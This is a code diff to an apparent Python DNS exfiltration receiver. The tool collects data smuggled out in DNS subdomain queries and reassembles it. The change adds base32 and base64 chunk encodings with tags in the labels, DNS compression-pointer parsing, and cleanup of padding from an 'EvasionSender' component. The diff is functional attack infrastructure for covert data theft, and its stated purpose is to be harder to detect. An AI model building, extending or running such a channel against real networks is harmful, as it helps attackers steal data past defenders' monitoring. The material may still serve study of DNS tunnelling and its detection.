@@ -26,35 +26,36 @@ logger = logging.getLogger(__name__)
 
 @dataclass
 class ChunkBuffer:
-    """Accumulates sequenced hex chunks for a single exfiltration session.
+    """Accumulates sequenced encoded chunks for a single exfiltration session.
 
     Attributes:
         domain: The base domain for this session (e.g. 'exfil.invalid').
         src_ip: Source IP of the sender.
-        chunks: Mapping of sequence number to hex chunk string.
+        encoding: Payload encoding inferred from the first chunk's wire tag.
+        chunks: Mapping of sequence number to encoded chunk string.
         complete: True once a 'done' terminator has been received.
     """
 
     domain: str
     src_ip: str
+    encoding: str = "hex"
     chunks: dict[int, str] = field(default_factory=dict)
     complete: bool = False
 
-    def add_chunk(self, seq: int, hex_chunk: str) -> None:
-        """Store a hex chunk at the given sequence position.
+    def add_chunk(self, seq: int, chunk: str) -> None:
+        """Store an encoded chunk at the given sequence position.
 
         Args:
             seq: Sequence number parsed from the subdomain label prefix.
-            hex_chunk: Hex-encoded data string from the subdomain label.
+            chunk: Encoded payload fragment from the subdomain label.
         """
-        self.chunks[seq] = hex_chunk
+        self.chunks[seq] = chunk
 
     def reconstruct(self) -> bytes:
-        """Reassemble chunks in sequence order and hex-decode to bytes.
+        """Reassemble chunks in sequence order and decode to bytes.
 
-        Non-hex characters are stripped from each chunk to handle any
-        padding appended by EvasionSender. Returns empty bytes if no
-        chunks have been stored.
+        Characters outside the encoding's alphabet are stripped to handle
+        EvasionSender padding. Returns empty bytes if no chunks have been stored.
 
         Returns:
             Reconstructed payload as bytes, or b'' on decode failure.
@@ -62,11 +63,26 @@ class ChunkBuffer:
         if not self.chunks:
             return b""
         ordered = [self.chunks[k] for k in sorted(self.chunks.keys())]
-        hex_str = "".join(re.sub(r"[^0-9a-fA-F]", "", chunk) for chunk in ordered)
+        if self.encoding == "hex":
+            clean = lambda s: re.sub(r"[^0-9a-fA-F]", "", s)
+        elif self.encoding == "base32":
+            clean = lambda s: re.sub(r"[^a-z2-7]", "", s)
+        else:  # base64
+            clean = lambda s: re.sub(r"[^A-Za-z0-9\-_]", "", s)
+        cleaned = "".join(clean(chunk) for chunk in ordered)
         try:
-            return bytes.fromhex(hex_str)
-        except ValueError as exc:
-            logger.error("reconstruct: hex decode failed: %s", exc)
+            import base64 as _b64
+
+            if self.encoding == "hex":
+                return bytes.fromhex(cleaned)
+            if self.encoding == "base32":
+                upper = cleaned.upper()
+                pad = (8 - len(upper) % 8) % 8
+                return _b64.b32decode(upper + "=" * pad)
+            pad = (4 - len(cleaned) % 4) % 4
+            return _b64.urlsafe_b64decode(cleaned + "=" * pad)
+        except Exception as exc:
+            logger.error("reconstruct: decode failed (encoding=%s): %s", self.encoding, exc)
             return b""
 
 
@@ -74,8 +90,9 @@ class DNSReceiver:
     """Minimal UDP server that reconstructs exfiltrated payloads from DNS subdomain queries.
 
     Listens on a UDP socket. For each incoming packet, the DNS wire-format query
-    name is extracted and parsed. Labels matching the pattern ``SEQ_HEXCHUNK``
-    are stored in a per-session ChunkBuffer. On receiving a ``done.DOMAIN``
+    name is extracted and parsed. Labels matching ``SEQ_encodingTag_chunk``
+    (encoding tag ``h``, ``b32``, or ``b64``) are stored in a per-session
+    ``ChunkBuffer``. On receiving a ``done.DOMAIN``
     terminator, the buffer is reconstructed and the ``on_complete`` callback is
     invoked.
 
@@ -132,11 +149,21 @@ class DNSReceiver:
             Dot-separated domain name string, or ``""`` on parse error.
         """
         labels = []
+        visited: set[int] = set()
         try:
             while True:
+                if offset in visited:
+                    break
+                visited.add(offset)
                 length = data[offset]
                 if length == 0:
                     break
+                if (length & 0xC0) == 0xC0:
+                    if offset + 1 >= len(data):
+                        break
+                    ptr = ((length & 0x3F) << 8) | data[offset + 1]
+                    offset = ptr
+                    continue
                 offset += 1
                 labels.append(data[offset:offset + length].decode("ascii", errors="replace"))
                 offset += length
@@ -180,16 +207,23 @@ class DNSReceiver:
                 del self._sessions[session_key]
             return
 
-        if "_" not in label:
+        label_parts = label.split("_", 2)
+        if len(label_parts) < 3:
             return
-        prefix, hex_chunk = label.split("_", 1)
-        if not prefix.isdigit():
+        seq_str, encoding_tag, payload_chunk = label_parts
+        if not seq_str.isdigit():
             return
-        seq = int(prefix)
+        _tag_to_encoding = {"h": "hex", "b32": "base32", "b64": "base64"}
+        if encoding_tag not in _tag_to_encoding:
+            return
+        seq = int(seq_str)
+        inferred_encoding = _tag_to_encoding[encoding_tag]
 
         if session_key not in self._sessions:
-            self._sessions[session_key] = ChunkBuffer(domain=base_domain, src_ip=src_ip)
-        self._sessions[session_key].add_chunk(seq, hex_chunk)
+            self._sessions[session_key] = ChunkBuffer(
+                domain=base_domain, src_ip=src_ip, encoding=inferred_encoding
+            )
+        self._sessions[session_key].add_chunk(seq, payload_chunk)
         logger.debug("received chunk seq=%d domain=%s src=%s", seq, base_domain, src_ip)
 
     def start(self) -> None:
